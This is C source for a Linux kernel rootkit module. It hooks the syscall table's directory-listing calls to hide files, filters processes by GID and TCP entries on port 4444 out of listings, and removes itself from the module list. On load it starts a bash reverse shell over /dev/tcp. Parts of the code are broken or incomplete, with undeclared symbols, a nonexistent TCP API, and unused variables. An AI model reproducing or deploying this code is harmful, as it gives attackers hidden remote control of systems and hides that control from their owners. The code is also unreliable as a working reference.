#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/tcp.h>
#include <linux/workqueue.h>
#include <linux/cred.h>
#include <net/tcp.h>

// --- CONFIG ---
#define HIDE_PREFIX    "kingkit"
#define HIDDEN_PORT    4444        // Port to hide
#define HIDDEN_GID     5005        // Hide processes with this GID
#define REV_HOST       "127.0.0.1" // Reverse shell IP
#define REV_PORT       4444        // Reverse shell port
#define TRIGGER_CMD    "cron"      // Process to trigger reverse shell
// ---

static unsigned long *syscall_table;
static asmlinkage long (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
static asmlinkage long (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int);
static struct proc_dir_entry *proc_entry = NULL;

// --- UTILITIES ---
void **get_syscall_table(void) {
    unsigned long offset;
    void **sct;
    for (offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
        sct = (void **)offset;
        if (sct[__NR_close] == (void *)sys_close)
            return sct;
    }
    return NULL;
}

// --- FILE HIDING ---
static asmlinkage long hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    long ret = orig_getdents64(fd, dirp, count);
    struct linux_dirent64 *dir;
    unsigned long off = 0;

    while (off < ret) {
        dir = (struct linux_dirent64 *)((char *)dirp + off);
        if (memcmp(dir->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
            memmove(dir, (char *)dir + dir->d_reclen, ret - off - dir->d_reclen);
            ret -= dir->d_reclen;
        } else {
            off += dir->d_reclen;
        }
    }
    return ret;
}

static asmlinkage long hook_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    long ret = orig_getdents(fd, dirp, count);
    struct linux_dirent *dir;
    unsigned long off = 0;

    while (off < ret) {
        dir = (struct linux_dirent *)((char *)dirp + off);
        if (memcmp(dir->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
            memmove(dir, (char *)dir + dir->d_reclen, ret - off - dir->d_reclen);
            ret -= dir->d_reclen;
        } else {
            off += dir->d_reclen;
        }
    }
    return ret;
}

// --- PROCESS HIDING ---
static int hide_pid = 0;
static int proc_hide_show(struct seq_file *m, void *v) {
    struct task_struct *task;
    for_each_process(task) {
        if (task->cred->gid.val == HIDDEN_GID) {
            hide_pid = task->pid;
            continue;
        }
        seq_printf(m, "%d %s\n", task->pid, task->comm);
    }
    return 0;
}

static int proc_hide_open(struct inode *inode, struct file *file) {
    return single_open(file, proc_hide_show, NULL);
}

static struct file_operations hide_fops = {
    .open = proc_hide_open,
    .read = seq_read,
    .llseek = seq_lseek,
    .release = single_release,
};

// --- REVERSE SHELL ---
static struct work_struct rev_work;
static void reverse_shell_worker(struct work_struct *work) {
    char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/" REV_HOST "/" __stringify(REV_PORT) " 0>&1", NULL};
    static char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

// --- NETWORK HIDING ---
static int tcp_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *inet = v;
    if (v != SEQ_START_TOKEN) {
        if (ntohs(inet->inet_sport) == HIDDEN_PORT || ntohs(inet->inet_dport) == HIDDEN_PORT)
            return 0;
    }
    return orig_tcp_seq_show(seq, v);
}

static struct tcp_seq_afinfo *orig_tcp_afinfo;
static void hook_tcp_seq_show(void) {
    orig_tcp_afinfo->seq_ops.show = tcp_seq_show;
}

// --- MODULE HIDING ---
static void hide_module(void) {
    list_del_init(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

// --- INIT/EXIT ---
static int __init rootkit_init(void) {
    // Get syscall table
    syscall_table = (unsigned long *)get_syscall_table();
    if (!syscall_table) return -EINVAL;

    // Hook directory listings
    orig_getdents64 = (void *)syscall_table[__NR_getdents64];
    orig_getdents = (void *)syscall_table[__NR_getdents];
    syscall_table[__NR_getdents64] = (unsigned long)hook_getdents64;
    syscall_table[__NR_getdents] = (unsigned long)hook_getdents;

    // Hide processes
    proc_entry = proc_create("hide_pids", 0, NULL, &hide_fops);

    // Reverse shell trigger
    INIT_WORK(&rev_work, reverse_shell_worker);
    schedule_work(&rev_work);

    // Hide network connections
    orig_tcp_afinfo = tcp_get_afinfo(AF_INET);
    hook_tcp_seq_show();

    // Hide module
    hide_module();

    printk(KERN_INFO "Rootkit loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    // Restore syscalls
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    syscall_table[__NR_getdents] = (unsigned long)orig_getdents;

    // Remove proc entry
    if (proc_entry) proc_remove(proc_entry);

    // Restore TCP seq show
    orig_tcp_afinfo->seq_ops.show = orig_tcp_seq_show;

    printk(KERN_INFO "Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
